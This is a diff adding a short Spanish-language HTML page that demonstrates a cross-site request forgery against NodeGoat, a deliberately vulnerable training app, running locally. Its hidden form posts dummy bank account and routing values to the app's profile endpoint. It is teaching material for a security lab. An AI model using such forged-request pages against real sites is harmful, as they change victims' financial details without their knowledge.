@@ -1,0 +1,16 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title>Demostración local de CSRF para NodeGoat</title>
+</head>
+<body>
+  <h1>Prueba CSRF en el laboratorio local</h1>
+  <p>Esta forma envía datos ficticios únicamente a NodeGoat en 127.0.0.1:4000.</p>
+  <form method="POST" action="http://127.0.0.1:4000/profile">
+    <input type="hidden" name="bankAcc" value="9999999">
+    <input type="hidden" name="bankRouting" value="0198212#">
+    <button type="submit">Enviar cambios de prueba a NodeGoat local</button>
+  </form>
+</body>
+</html>
